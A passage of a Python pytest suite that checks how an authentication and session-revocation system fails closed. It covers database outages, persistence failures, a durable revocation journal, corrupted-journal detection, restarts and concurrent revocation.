    from serein_core.auth import SecurityManager, security_manager
    bus = CommandBus()
    
    # Invariant: No create_authenticated_session on CommandBus
    assert not hasattr(bus, "create_authenticated_session"), "CommandBus must not have unauthenticated session minting helper"
    assert not hasattr(CommandBus, "create_authenticated_session"), "CommandBus class must not have unauthenticated session minting helper"
    
    # Invariant: No create_session on SecurityManager
    assert not hasattr(security_manager, "create_session"), "SecurityManager must not have unauthenticated session minting helper"
    assert not hasattr(SecurityManager, "create_session"), "SecurityManager class must not have unauthenticated session minting helper"


@pytest.mark.asyncio
async def test_authenticate_requires_valid_credentials():
    """
    Adversarial test: Authenticate requires genuine registered credentials.
    Wrong passwords and non-existent users are rejected, and no session is created.
    """
    from serein_core.auth import security_manager
    bus = CommandBus()
    
    # Register test user
    username = "auth_strict_user"
    password = "CorrectPassword123!"
    if username not in security_manager._users:
        security_manager.register_user(username, password, role="admin", age_confirmed=True)
    
    # Attempt 1: Wrong password -> rejected
    bad_token = await bus.authenticate(username, "WrongPassword999!")
    assert bad_token is None, "Wrong password must return None"
    
    # Attempt 2: Nonexistent user -> rejected
    nonexistent_token = await bus.authenticate("nobody_exists_here", "AnyPassword!")
    assert nonexistent_token is None, "Nonexistent user must return None"
    
    # Invariant: Neither attempt created a session
    assert not await bus._is_valid_session(bad_token)
    assert not await bus._is_valid_session(nonexistent_token)
    
    # Correct credentials -> succeeds
    valid_token = await bus.authenticate(username, password)
    assert valid_token is not None
    assert valid_token.startswith("sess_")
    assert await bus._is_valid_session(valid_token) is True


@pytest.mark.asyncio
async def test_persistence_failure_fails_closed():
    """
    Adversarial test: If SQLite session persistence fails, authentication must fail closed.
    The in-memory session must be immediately revoked and authenticate() must return None.
    """
    from serein_core.auth import security_manager
    bus = CommandBus()
    db = await bus._get_db()
    
    username = "persist_fail_user"
    password = "SecurePassword123!"
    if username not in security_manager._users:
        security_manager.register_user(username, password, role="admin", age_confirmed=True)
    
    # Mock DB create_auth_session to simulate disk write failure / SQLite error
    with patch.object(db, "create_auth_session", AsyncMock(return_value=False)):
        res_token = await bus.authenticate(username, password)
        assert res_token is None, "Authentication must fail closed when DB persistence fails"
    
    # Invariant: No active in-memory session was left behind
    for token, sess in list(security_manager._sessions.items()):
        assert sess.username != username, "No orphan in-memory session must remain after persistence failure"


@pytest.mark.asyncio
async def test_session_revocation_invalidates_memory_and_persisted_storage():
    """
    Adversarial test: Revoking a session invalidates it across both in-memory SecurityManager
    and SQLite authenticated_sessions table. Subsequent confirmation attempts must be DENIED.
    """
    from serein_core.auth import security_manager
    bus = CommandBus(allowed_tiers={PermissionTier.READ_ONLY, PermissionTier.DESTRUCTIVE})
    db = await bus._get_db()
    
    username = "revoke_test_user"
    password = "SecurePassword123!"
    token = await get_test_authenticated_session(bus, username=username, password=password)
    assert await bus._is_valid_session(token) is True
    
    # Request a sensitive action confirmation while session is valid
    req = await bus.execute("shutdown", session_id=token)
    assert req.status is CommandStatus.CONFIRMATION_REQUIRED
    challenge_token = req.challenge_id
    assert challenge_token is not None
    
    # Now revoke the session
    revoked = await bus.revoke_session(token)
    assert revoked is True
    
    # Invariant 1: In-memory session purged
    assert token not in security_manager._sessions
    
    # Invariant 2: Database row marked revoked
    db_row = await db.fetch_one("SELECT revoked FROM authenticated_sessions WHERE session_token = ?", (token,))
    assert db_row is not None
    assert db_row["revoked"] == 1
    
    # Invariant 3: _is_valid_session returns False
    assert await bus._is_valid_session(token) is False
    
    # Invariant 4: Attempting to confirm with revoked session must be DENIED
    denied = await bus.confirm(challenge_token, approved=True, session_id=token)
    assert denied.success is False
    assert denied.status is CommandStatus.DENIED
    assert "Invalid or expired authenticated session" in denied.error


# =========================================================================
# 22. Authentication Fail-Closed Invariants: Database Failures & Restarts
# =========================================================================

@pytest.mark.asyncio
async def test_is_valid_session_fails_closed_when_database_unavailable():
    """
    _is_valid_session() must fail closed whenever the SQLite database is unavailable.
    It must NEVER fall back to accepting an in-memory session.
    """
    from serein_core.auth import security_manager
    bus = CommandBus(
        allowed_tiers={PermissionTier.READ_ONLY, PermissionTier.DESTRUCTIVE},
        require_session=True,
    )
    
    # Create an in-memory session in SecurityManager
    user = f"db_unavail_{int(time.time())}"
    security_manager.register_user(user, "SecurePass123!", role="admin", age_confirmed=True)
    in_memory_sess = security_manager.authenticate(user, "SecurePass123!")
    assert in_memory_sess is not None
    token = in_memory_sess.session_token

    # Simulate database completely unavailable
    with patch.object(bus, "_get_db", AsyncMock(return_value=None)):
        # Invariant 1: _is_valid_session returns False (never falls back to in-memory session)
        assert await bus._is_valid_session(token) is False
        
        # Invariant 2: Execution is strictly DENIED
        exec_res = await bus.execute("list_running_apps", session_id=token)
        assert exec_res.status is CommandStatus.DENIED
        assert "Missing or invalid authenticated session" in exec_res.error

        # Invariant 3: Confirmation is strictly rejected
        conf_res = await bus.confirm("nonexistent_challenge", approved=True, session_id=token)
        assert conf_res.success is False
        assert conf_res.status is CommandStatus.DENIED


@pytest.mark.asyncio
async def test_is_valid_session_fails_closed_on_database_exception():
    """
    _is_valid_session() must fail closed whenever an SQLite query raises an exception
    (e.g. disk corruption, locked database). Never fall back to in-memory session.
    """
    from serein_core.auth import security_manager
    bus = CommandBus(
        allowed_tiers={PermissionTier.READ_ONLY, PermissionTier.DESTRUCTIVE},
        require_session=True,
    )
    db = await bus._get_db()
    
    user = f"db_err_{int(time.time())}"
    security_manager.register_user(user, "SecurePass123!", role="admin", age_confirmed=True)
    in_memory_sess = security_manager.authenticate(user, "SecurePass123!")
    assert in_memory_sess is not None
    token = in_memory_sess.session_token

    # Simulate SQLite query exception (e.g. locked database / disk I/O error)
    with patch.object(db, "validate_auth_session", AsyncMock(side_effect=RuntimeError("SQLite disk I/O error"))):
        # Invariant: _is_valid_session returns False on exception
        assert await bus._is_valid_session(token) is False
        
        # Command execution fails closed
        exec_res = await bus.execute("list_running_apps", session_id=token)
        assert exec_res.status is CommandStatus.DENIED
        assert "Missing or invalid authenticated session" in exec_res.error


@pytest.mark.asyncio
async def test_authenticate_fails_closed_when_database_unavailable():
    """
    authenticate() must return None and purge in-memory session if the database is unavailable.
    """
    from serein_core.auth import security_manager
    bus = CommandBus(allowed_tiers={PermissionTier.READ_ONLY})
    
    user = f"auth_unavail_{int(time.time())}"
    security_manager.register_user(user, "SecurePass123!", role="admin", age_confirmed=True)

    with patch.object(bus, "_get_db", AsyncMock(return_value=None)):
        token = await bus.authenticate(user, "SecurePass123!")
        assert token is None, "authenticate must fail closed when DB is unavailable"

    # In-memory session was not retained
    assert not any(s.username == user for s in security_manager._sessions.values())


@pytest.mark.asyncio
async def test_authenticate_fails_closed_on_persistence_exception():
    """
    authenticate() must return None and purge in-memory session when DB raises an exception.
    """
    from serein_core.auth import security_manager
    bus = CommandBus(allowed_tiers={PermissionTier.READ_ONLY})
    db = await bus._get_db()
    
    user = f"auth_exc_{int(time.time())}"
    security_manager.register_user(user, "SecurePass123!", role="admin", age_confirmed=True)

    with patch.object(db, "create_auth_session", AsyncMock(side_effect=RuntimeError("DB locked"))):
        token = await bus.authenticate(user, "SecurePass123!")
        assert token is None, "authenticate must fail closed on persistence exception"

    # In-memory session was purged
    assert not any(s.username == user for s in security_manager._sessions.values())


@pytest.mark.asyncio
async def test_revoke_session_fails_closed_when_database_unavailable():
    """
    revoke_session() must return False if persistent storage is unavailable,
    and must ensure the session cannot authorize operations.
    """
    from serein_core.auth import security_manager
    bus = CommandBus(
        allowed_tiers={PermissionTier.READ_ONLY, PermissionTier.DESTRUCTIVE},
        require_session=True,
    )
    user = f"rev_unavail_{int(time.time())}"
    token = await get_test_authenticated_session(bus, username=user)
    assert await bus._is_valid_session(token) is True

    # Database becomes unavailable
    with patch.object(bus, "_get_db", AsyncMock(return_value=None)):
        revoked = await bus.revoke_session(token)
        # Invariant 1: Must return False because persistent revocation could not be confirmed
        assert revoked is False
        
        # Invariant 2: Session cannot authorize operations
        assert await bus._is_valid_session(token) is False
        exec_res = await bus.execute("list_running_apps", session_id=token)
        assert exec_res.status is CommandStatus.DENIED

    # Invariant 3: Even after DB mock ends, the session cannot authorize operations on this bus
    assert await bus._is_valid_session(token) is False
    assert token not in security_manager._sessions


@pytest.mark.asyncio
async def test_revoke_session_fails_closed_on_database_exception():
    """
    revoke_session() must return False on database exception,
    and must ensure the session cannot authorize operations.
    """
    from serein_core.auth import security_manager
    bus = CommandBus(
        allowed_tiers={PermissionTier.READ_ONLY, PermissionTier.DESTRUCTIVE},
        require_session=True,
    )
    db = await bus._get_db()
    user = f"rev_exc_{int(time.time())}"
    token = await get_test_authenticated_session(bus, username=user)
    assert await bus._is_valid_session(token) is True

    # DB raises exception during revocation
    with patch.object(db, "revoke_auth_session", AsyncMock(side_effect=RuntimeError("Storage failure"))):
        revoked = await bus.revoke_session(token)
        # Invariant 1: Must return False
        assert revoked is False

    # Invariant 2: In-memory session purged and cannot authorize operations
    assert token not in security_manager._sessions
    assert await bus._is_valid_session(token) is False
    exec_res = await bus.execute("list_running_apps", session_id=token)
    assert exec_res.status is CommandStatus.DENIED


@pytest.mark.asyncio
async def test_session_validity_after_revocation():
    """
    After successful revocation, _is_valid_session returns False and all operations are DENIED.
    """
    bus = CommandBus(
        allowed_tiers={PermissionTier.READ_ONLY, PermissionTier.DESTRUCTIVE},
        require_session=True,
    )
    user = f"post_rev_{int(time.time())}"
    token = await get_test_authenticated_session(bus, username=user)
    assert await bus._is_valid_session(token) is True

    # Revoke successfully
    revoked = await bus.revoke_session(token)
    assert revoked is True

    # Session is permanently invalid
    assert await bus._is_valid_session(token) is False
    exec_res = await bus.execute("list_running_apps", session_id=token)
    assert exec_res.status is CommandStatus.DENIED


@pytest.mark.asyncio
async def test_session_validity_after_database_restart(tmp_path):
    """
    Active session revalidates successfully after database restart / reconnection.
    """
    db_file = tmp_path / "restart_active_session.db"
    db1 = Database(path=db_file)
    await db1.connect()
    
    bus1 = CommandBus(
        allowed_tiers={PermissionTier.READ_ONLY, PermissionTier.DESTRUCTIVE},
        require_session=True,
        database=db1,
    )
    user = f"restart_user_{int(time.time())}"
    token = await get_test_authenticated_session(bus1, username=user)
    assert await bus1._is_valid_session(token) is True
    
    # Close database (simulating database outage / restart)
    await db1.close()
    
    # While DB is down, authentication must fail closed
    assert await bus1._is_valid_session(token) is False

    # Restart database and connect fresh bus instance
    db2 = Database(path=db_file)
    await db2.connect()
    bus2 = CommandBus(
        allowed_tiers={PermissionTier.READ_ONLY, PermissionTier.DESTRUCTIVE},
        require_session=True,
        database=db2,
    )
    
    # Active non-revoked session from SQLite must revalidate successfully
    assert await bus2._is_valid_session(token) is True
    exec_res = await bus2.execute("list_running_apps", session_id=token)
    assert exec_res.success is True
    
    await db2.close()


@pytest.mark.asyncio
async def test_revoked_session_remains_revoked_after_database_restart(tmp_path):
    """
    A revoked session must remain permanently revoked after database and process restart.
    """
    db_file = tmp_path / "restart_revoked_session.db"
    db1 = Database(path=db_file)
    await db1.connect()
    
    bus1 = CommandBus(
        allowed_tiers={PermissionTier.READ_ONLY, PermissionTier.DESTRUCTIVE},
        require_session=True,
        database=db1,
    )
    user = f"rev_restart_{int(time.time())}"
    token = await get_test_authenticated_session(bus1, username=user)
    assert await bus1._is_valid_session(token) is True
    
    # Revoke the session
    revoked = await bus1.revoke_session(token)
    assert revoked is True
    assert await bus1._is_valid_session(token) is False

    # Simulate database and process restart
    await db1.close()
    
    db2 = Database(path=db_file)
    await db2.connect()
    bus2 = CommandBus(
        allowed_tiers={PermissionTier.READ_ONLY, PermissionTier.DESTRUCTIVE},
        require_session=True,
        database=db2,
    )
    
    # Must remain revoked in new database connection / bus instance
    assert await bus2._is_valid_session(token) is False
    exec_res = await bus2.execute("list_running_apps", session_id=token)
    assert exec_res.status is CommandStatus.DENIED
    
    await db2.close()


# =========================================================================
# 23. Durable Revocation Journal, Restart Survival & Recovery Reconciliation
# =========================================================================

@pytest.mark.asyncio
async def test_revocation_while_sqlite_unavailable_persists_to_durable_journal(tmp_path):
    """
    When SQLite is unavailable during revocation, the revocation must be durably
    recorded in the on-disk recovery journal with fsync. In-memory session is purged
    and operations fail closed.
    """
    from serein_core.auth import security_manager
    db_file = tmp_path / "unavail_rev.db"
    journal_file = tmp_path / "unavail_rev.db.revocations"
    db = Database(path=db_file)
    await db.connect()

    bus = CommandBus(
        allowed_tiers={PermissionTier.READ_ONLY, PermissionTier.DESTRUCTIVE},
        require_session=True,
        database=db,
        revocation_journal_path=journal_file,
    )
    user = f"unavail_user_{int(time.time())}"
    token = await get_test_authenticated_session(bus, username=user)
    assert await bus._is_valid_session(token) is True

    # Simulate database becoming unavailable during revocation
    with patch.object(bus, "_get_db", AsyncMock(return_value=None)):
        revoked = await bus.revoke_session(token)
        # Returns False because persistent SQLite could not be confirmed immediately
        assert revoked is False

    # Invariant 1: Durable journal file exists on disk and contains the revoked token
    assert journal_file.exists()
    journal_content = journal_file.read_text(encoding="utf-8")
    assert token in journal_content

    # Invariant 2: In-memory session is purged
    assert token not in security_manager._sessions

    # Invariant 3: Session cannot authorize operations
    assert await bus._is_valid_session(token) is False
    exec_res = await bus.execute("list_running_apps", session_id=token)
    assert exec_res.status is CommandStatus.DENIED

    await db.close()


@pytest.mark.asyncio
async def test_process_restart_after_failed_revocation_remains_denied(tmp_path):
    """
    Critical restart vulnerability test:
    If SQLite persistent revocation failed earlier (so SQLite still has revoked=0),
    a process restart must read the durable on-disk journal and REJECT the session.
    The session must NEVER become valid again after restart.
    """
    from serein_core.auth import security_manager
    db_file = tmp_path / "restart_unresolved.db"
    journal_file = tmp_path / "restart_unresolved.db.revocations"
    db1 = Database(path=db_file)
    await db1.connect()

    bus1 = CommandBus(
        allowed_tiers={PermissionTier.READ_ONLY, PermissionTier.DESTRUCTIVE},
        require_session=True,
        database=db1,
        revocation_journal_path=journal_file,
    )
    user = f"fail_rev_{int(time.time())}"
    token = await get_test_authenticated_session(bus1, username=user)
    assert await bus1._is_valid_session(token) is True

    # Simulate SQLite storage failure during revocation
    with patch.object(db1, "revoke_auth_session", AsyncMock(side_effect=sqlite3.OperationalError("disk locked"))):
        revoked = await bus1.revoke_session(token)
        assert revoked is False

    # Confirm SQLite still has revoked=0 (because SQLite write failed)
    row = await db1.fetch_one("SELECT revoked FROM authenticated_sessions WHERE session_token = ?", (token,))
    assert row is not None
    assert row["revoked"] == 0

    # Confirm token was durably recorded in journal
    assert token in journal_file.read_text(encoding="utf-8")

    # Terminate process 1 completely: discard bus1, close db1, purge in-memory state
    await db1.close()
    security_manager._sessions.clear()

    # Start process 2: Fresh CommandBus instance connected to same DB and journal files
    db2 = Database(path=db_file)
    await db2.connect()
    bus2 = CommandBus(
        allowed_tiers={PermissionTier.READ_ONLY, PermissionTier.DESTRUCTIVE},
        require_session=True,
        database=db2,
        revocation_journal_path=journal_file,
    )

    # Invariant: On restart, bus2 must recognize unresolved revocation from journal
    # Even though SQLite row still has revoked=0, bus2 MUST reject the token!
    assert await bus2._is_valid_session(token) is False

    # Operations must be strictly DENIED
    exec_res = await bus2.execute("list_running_apps", session_id=token)
    assert exec_res.status is CommandStatus.DENIED
    assert "Missing or invalid authenticated session" in exec_res.error

    conf_res = await bus2.confirm("any_challenge_id", approved=True, session_id=token)
    assert conf_res.status is CommandStatus.DENIED

    await db2.close()


@pytest.mark.asyncio
async def test_database_recovery_after_failed_revocation_reconciles_successfully(tmp_path):
    """
    When the SQLite database recovers, reconcile_revocations() must sync all pending
    journal revocations into SQLite (setting revoked=1) and prune the journal.
    """
    db_file = tmp_path / "recovery_reconcile.db"
    journal_file = tmp_path / "recovery_reconcile.db.revocations"
    db = Database(path=db_file)
    await db.connect()

    bus = CommandBus(
        allowed_tiers={PermissionTier.READ_ONLY, PermissionTier.DESTRUCTIVE},
        require_session=True,
        database=db,
        revocation_journal_path=journal_file,
    )
    user = f"recov_user_{int(time.time())}"
    token = await get_test_authenticated_session(bus, username=user)
    assert await bus._is_valid_session(token) is True

    # Simulate SQLite failure during revocation
    with patch.object(db, "revoke_auth_session", AsyncMock(side_effect=sqlite3.OperationalError("disk locked"))):
        assert await bus.revoke_session(token) is False

    # SQLite still has revoked=0; journal has token
    row = await db.fetch_one("SELECT revoked FROM authenticated_sessions WHERE session_token = ?", (token,))
    assert row["revoked"] == 0
    assert token in bus._read_revocation_journal()

    # Now database recovers (mock removed, healthy DB connection)
    reconciled = await bus.reconcile_revocations()
    assert reconciled == 1

    # Invariant 1: SQLite now permanently updated to revoked=1
    row_updated = await db.fetch_one("SELECT revoked FROM authenticated_sessions WHERE session_token = ?", (token,))
    assert row_updated["revoked"] == 1

    # Invariant 2: Journal pruned
    assert token not in bus._read_revocation_journal()
    assert token not in bus._unresolved_revocations

    # Invariant 3: Session remains permanently invalid
    assert await bus._is_valid_session(token) is False

    await db.close()


@pytest.mark.asyncio
async def test_previously_revoked_token_reuse_strictly_blocked(tmp_path):
    """
    A previously revoked token must never be accepted for any command tier, confirmation,
    or D-Bus IPC. Re-authenticating issues a new token while old token remains dead.
    """
    db_file = tmp_path / "reuse_blocked.db"
    db = Database(path=db_file)
    await db.connect()

    bus = CommandBus(
        allowed_tiers={PermissionTier.READ_ONLY, PermissionTier.REVERSIBLE, PermissionTier.DESTRUCTIVE},
        require_session=True,
        database=db,
    )
    user = f"reuse_user_{int(time.time())}"
    token = await get_test_authenticated_session(bus, username=user)
    assert await bus._is_valid_session(token) is True

    # Revoke session
    assert await bus.revoke_session(token) is True
    assert await bus._is_valid_session(token) is False

    # Attempt reuse across all operations
    assert (await bus.execute("list_running_apps", session_id=token)).status is CommandStatus.DENIED
    assert (await bus.execute("set_volume", params={"level": 50}, session_id=token)).status is CommandStatus.DENIED
    assert (await bus.execute("shutdown", session_id=token)).status is CommandStatus.DENIED
    assert (await bus.confirm("fake_challenge", approved=True, session_id=token)).status is CommandStatus.DENIED

    # New login produces a new valid session token
    new_token = await bus.authenticate(user, "ValidSecurePass123!")
    assert new_token is not None
    assert new_token != token
    assert await bus._is_valid_session(new_token) is True
    assert await bus._is_valid_session(token) is False

    await db.close()


@pytest.mark.asyncio
async def test_concurrent_validation_and_revocation_race_safety(tmp_path):
    """
    Concurrent validation and revocation attempts must not deadlock, corrupt state,
    or allow a revoked session to be validated after revocation completes.
    """
    db_file = tmp_path / "concurrent_race.db"
    db = Database(path=db_file)
    await db.connect()

    bus = CommandBus(
        allowed_tiers={PermissionTier.READ_ONLY, PermissionTier.DESTRUCTIVE},
        require_session=True,
        database=db,
    )
    user = f"race_user_{int(time.time())}"
    token = await get_test_authenticated_session(bus, username=user)

    async def validate_loop():
        for _ in range(20):
            await bus._is_valid_session(token)
            await asyncio.sleep(0.001)

    async def execute_loop():
        for _ in range(10):
            await bus.execute("list_running_apps", session_id=token)
            await asyncio.sleep(0.002)

    async def do_revoke():
        await asyncio.sleep(0.005)
        return await bus.revoke_session(token)

    results = await asyncio.gather(
        validate_loop(),
        execute_loop(),
        do_revoke(),
        validate_loop(),
        return_exceptions=False,
    )

    # Invariant: Final state is strictly revoked
    assert await bus._is_valid_session(token) is False
    exec_final = await bus.execute("list_running_apps", session_id=token)
    assert exec_final.status is CommandStatus.DENIED

    await db.close()


@pytest.mark.asyncio
async def test_successful_persistent_revocation_across_restart(tmp_path):
    """
    Successful persistent revocation permanently updates SQLite (revoked=1),
    surviving database, process, and bus restart.
    """
    db_file = tmp_path / "persistent_rev_restart.db"
    db1 = Database(path=db_file)
    await db1.connect()

    bus1 = CommandBus(
        allowed_tiers={PermissionTier.READ_ONLY, PermissionTier.DESTRUCTIVE},
        require_session=True,
        database=db1,
    )
    user = f"persist_user_{int(time.time())}"
    token = await get_test_authenticated_session(bus1, username=user)
    assert await bus1._is_valid_session(token) is True

    # Revoke session while DB is healthy
    assert await bus1.revoke_session(token) is True
    assert await bus1._is_valid_session(token) is False

    # Terminate process 1
    await db1.close()

    # Restart process 2
    db2 = Database(path=db_file)
    await db2.connect()
    bus2 = CommandBus(
        allowed_tiers={PermissionTier.READ_ONLY, PermissionTier.DESTRUCTIVE},
        require_session=True,
        database=db2,
    )

    # Invariant: Permanently revoked in SQLite
    assert await bus2._is_valid_session(token) is False
    row = await db2.fetch_one("SELECT revoked FROM authenticated_sessions WHERE session_token = ?", (token,))
    assert row["revoked"] == 1

    exec_res = await bus2.execute("list_running_apps", session_id=token)
    assert exec_res.status is CommandStatus.DENIED

    await db2.close()


# =========================================================================
# 24. Durable Revocation Journal Integrity & Fail-Closed Invariants
# =========================================================================

@pytest.mark.asyncio
async def test_journal_exists_but_unreadable_triggers_fail_closed(tmp_path):
    """
    If the journal file exists but is unreadable (e.g. PermissionError),
    CommandBus must NOT swallow the error or assume an empty journal.
    It must trigger fail-closed state and reject all authenticated operations.
    """
    journal_file = tmp_path / "unreadable.journal"
    journal_file.write_text("# SEREIN_REVOCATION_JOURNAL_V1\n", encoding="utf-8")

    real_open = open

    def fake_open(file, *args, **kwargs):
        if str(file) == str(journal_file):
            raise PermissionError("Access denied by OS security policy")
        return real_open(file, *args, **kwargs)

    with patch("builtins.open", side_effect=fake_open):
        bus = CommandBus(
            allowed_tiers={PermissionTier.READ_ONLY, PermissionTier.DESTRUCTIVE},
            require_session=True,
            revocation_journal_path=journal_file,
        )

    # Invariant 1: Bus enters fail-closed state
    assert bus._security_fail_closed is True
    assert "permission" in (bus._fail_closed_reason or "").lower()

    # Invariant 2: Session validation fails closed
    assert await bus._is_valid_session("any_token") is False

    # Invariant 3: Authenticated operations are denied
    res = await bus.execute("list_running_apps", session_id="any_token")
    assert res.status is CommandStatus.DENIED
    assert "fail-closed" in res.error.lower()


@pytest.mark.asyncio
async def test_journal_corrupted_or_malformed_triggers_fail_closed(tmp_path):
    """
    If the journal file exists but contains corrupted, malformed, or checksum-mismatched
    entries, CommandBus must trigger fail-closed security state.
    """
    # 1. Missing delimiter / malformed line
    j1 = tmp_path / "corrupt1.journal"
    j1.write_text("malformed_entry_without_delimiter\n", encoding="utf-8")
    bus1 = CommandBus(revocation_journal_path=j1, require_session=True)
    assert bus1._security_fail_closed is True
    assert "malformed" in (bus1._fail_closed_reason or "").lower()
    res1 = await bus1.execute("list_running_apps", session_id="token1")
    assert res1.status is CommandStatus.DENIED

    # 2. Checksum mismatch
    j2 = tmp_path / "corrupt2.journal"
    j2.write_text("valid_token|0123456789abcdef\n", encoding="utf-8")
    bus2 = CommandBus(revocation_journal_path=j2, require_session=True)
    assert bus2._security_fail_closed is True
    assert "checksum mismatch" in (bus2._fail_closed_reason or "").lower()
    res2 = await bus2.execute("list_running_apps", session_id="token2")
    assert res2.status is CommandStatus.DENIED

    # 3. Contains null bytes
    j3 = tmp_path / "corrupt3.journal"
    j3.write_bytes(b"some_token|12345678\x00\x00\x00")
    bus3 = CommandBus(revocation_journal_path=j3, require_session=True)
    assert bus3._security_fail_closed is True
    assert "null bytes" in (bus3._fail_closed_reason or "").lower()
    res3 = await bus3.execute("list_running_apps", session_id="token3")
    assert res3.status is CommandStatus.DENIED


@pytest.mark.asyncio
async def test_journal_write_failure_with_sqlite_unavailable_triggers_fail_closed(tmp_path):
    """
    If both journal append AND SQLite persistence fail during revocation,
    the Command Bus must enter fail-closed lockdown and refuse authenticated operations.
    """
    db_file = tmp_path / "both_fail.db"
    journal_file = tmp_path / "both_fail.db.revocations"
    db = Database(path=db_file)
    await db.connect()

    bus = CommandBus(
        allowed_tiers={PermissionTier.READ_ONLY, PermissionTier.DESTRUCTIVE},
        require_session=True,
        database=db,
        revocation_journal_path=journal_file,
    )
    user = f"both_user_{int(time.time())}"
    token = await get_test_authenticated_session(bus, username=user)
    assert await bus._is_valid_session(token) is True

    # Simulate simultaneous journal write failure and SQLite failure
    with patch.object(bus, "_write_revocation_journal", return_value=False), \
         patch.object(db, "revoke_auth_session", AsyncMock(return_value=False)):
        revoked = await bus.revoke_session(token)
        assert revoked is False

    # Invariant: Bus entered fail-closed lockdown
    assert bus._security_fail_closed is True
    assert "could not be durably recorded" in (bus._fail_closed_reason or "").lower()

    # Operations fail closed
    assert await bus._is_valid_session(token) is False
    res = await bus.execute("list_running_apps", session_id=token)
    assert res.status is CommandStatus.DENIED
    assert "fail-closed" in res.error.lower()

    await db.close()


@pytest.mark.asyncio
async def test_process_restart_after_both_persistence_fail_fails_closed(tmp_path):
    """
    If both journal write and SQLite persistence failed earlier,
    a process restart must still refuse to treat the session as valid
    and maintain fail-closed protection.
    """
    from serein_core.auth import security_manager
    db_file = tmp_path / "both_restart.db"
    journal_file = tmp_path / "both_restart.db.revocations"
    db1 = Database(path=db_file)
    await db1.connect()

    bus1 = CommandBus(
        allowed_tiers={PermissionTier.READ_ONLY, PermissionTier.DESTRUCTIVE},
        require_session=True,
        database=db1,
        revocation_journal_path=journal_file,
    )
    user = f"both_rst_user_{int(time.time())}"
    token = await get_test_authenticated_session(bus1, username=user)
    assert await bus1._is_valid_session(token) is True

    # Both fail during revocation
    with patch.object(bus1, "_write_revocation_journal", return_value=False), \
         patch.object(db1, "revoke_auth_session", AsyncMock(return_value=False)):
        assert await bus1.revoke_session(token) is False

    # Terminate process 1 completely
    await db1.close()
    security_manager._sessions.clear()

    # Process 2 restart
    db2 = Database(path=db_file)
    await db2.connect()
    bus2 = CommandBus(
        allowed_tiers={PermissionTier.READ_ONLY, PermissionTier.DESTRUCTIVE},
        require_session=True,
        database=db2,
        revocation_journal_path=journal_file,
    )

    # Invariant: bus2 recognizes dirty recovery state and fails closed
    assert bus2._security_fail_closed is True
    assert await bus2._is_valid_session(token) is False

    res = await bus2.execute("list_running_apps", session_id=token)
    assert res.status is CommandStatus.DENIED
    assert "fail-closed" in res.error.lower()

    await db2.close()


@pytest.mark.asyncio
async def test_journal_append_truncated_or_incomplete_triggers_fail_closed(tmp_path):
    """
    A simulated power loss or crash causing a truncated / torn line in the journal
    must be detected on subsequent startup and trigger fail-closed state.
    """
    journal_file = tmp_path / "truncated.journal"
    # Write a torn line (truncated checksum)
    journal_file.write_text("serein_token_valid_prefix|torn_c\n", encoding="utf-8")

    bus = CommandBus(revocation_journal_path=journal_file, require_session=True)
    assert bus._security_fail_closed is True
    assert "malformed" in (bus._fail_closed_reason or "").lower()

    res = await bus.execute("list_running_apps", session_id="serein_token_valid_prefix")
    assert res.status is CommandStatus.DENIED


@pytest.mark.asyncio
async def test_crash_during_journal_prune_atomic_replacement_keeps_journal_intact(tmp_path):
    """
    If a crash occurs during journal pruning (before os.replace completes),
    the original journal file must remain intact and valid with all existing tokens.
    """
    journal_file = tmp_path / "prune_crash.journal"
    bus = CommandBus(revocation_journal_path=journal_file)

    tok1 = "token_one_to_keep"
    tok2 = "token_two_to_prune"
    assert bus._write_revocation_journal(tok1) is True
    assert bus._write_revocation_journal(tok2) is True

    # Verify both present
    initial_tokens = bus._read_revocation_journal()
    assert tok1 in initial_tokens
    assert tok2 in initial_tokens

    # Simulate crash right before atomic replace
    with patch("os.replace", side_effect=OSError("Simulated crash right before replace")):
        pruned = bus._prune_revocation_journal({tok2})
        assert pruned is False

    # Original journal must remain completely intact
    after_tokens = bus._read_revocation_journal()
    assert tok1 in after_tokens
    assert tok2 in after_tokens


@pytest.mark.asyncio
async def test_concurrent_revocation_and_reconciliation_race_safety(tmp_path):
    """
    Concurrent revocations and reconciliations running in parallel must not corrupt
    the journal file, lose tokens, or produce race errors.
    """
    db_file = tmp_path / "concurrent_race.db"
    journal_file = tmp_path / "concurrent_race.db.revocations"
    db = Database(path=db_file)
    await db.connect()

    bus = CommandBus(database=db, revocation_journal_path=journal_file)
    tokens = []
    for i in range(10):
        t = await get_test_authenticated_session(bus, username=f"race_user_{i}_{int(time.time())}")
        tokens.append(t)

    async def worker_revoke(tok):
        return await bus.revoke_session(tok)

    async def worker_reconcile():
        return await bus.reconcile_revocations()

    # Mix concurrent revokes and reconciles
    tasks = [worker_revoke(t) for t in tokens] + [worker_reconcile() for _ in range(5)]
    results = await asyncio.gather(*tasks, return_exceptions=True)

    for r in results:
        assert not isinstance(r, Exception), f"Unexpected exception in concurrent task: {r}"

    # Verify all tokens are revoked in SQLite
    for t in tokens:
        assert await bus._is_valid_session(t) is False
        row = await db.fetch_one("SELECT revoked FROM authenticated_sessions WHERE session_token = ?", (t,))
        assert row is not None and row["revoked"] == 1

    await db.close()


@pytest.mark.asyncio
async def test_recovery_after_storage_becomes_available_clears_fail_closed(tmp_path):
    """
    When the database recovers after a double-failure, reconcile_revocations()
    syncs all unpersisted entries into SQLite, removes dirty markers, and
    clears the fail-closed security state.
    """
    db_file = tmp_path / "recover_storage.db"
    journal_file = tmp_path / "recover_storage.db.revocations"
    db = Database(path=db_file)
    await db.connect()

    bus = CommandBus(
        allowed_tiers={PermissionTier.READ_ONLY, PermissionTier.DESTRUCTIVE},
        require_session=True,
        database=db,
        revocation_journal_path=journal_file,
    )
    user = f"rec_storage_user_{int(time.time())}"
    token = await get_test_authenticated_session(bus, username=user)

    # Induce double-failure
    with patch.object(bus, "_write_revocation_journal", return_value=False), \
         patch.object(db, "revoke_auth_session", AsyncMock(return_value=False)):
        assert await bus.revoke_session(token) is False

    assert bus._security_fail_closed is True

    # Storage is now fully available again
    reconciled = await bus.reconcile_revocations()
    assert reconciled == 1

    # Invariant: fail-closed is safely cleared and session is revoked in SQLite
    assert bus._security_fail_closed is False
    assert bus._fail_closed_reason is None

    row = await db.fetch_one("SELECT revoked FROM authenticated_sessions WHERE session_token = ?", (token,))
    assert row["revoked"] == 1

    await db.close()


@pytest.mark.asyncio
async def test_unauthenticated_commands_allowed_while_authenticated_denied_during_fail_closed(tmp_path):
    """
    During fail-closed lockdown:
    - Authenticated commands are strictly DENIED.
    - Sensitive/destructive commands are strictly DENIED.
    - Unauthenticated read-only commands (when session is not required) remain operational.
    """
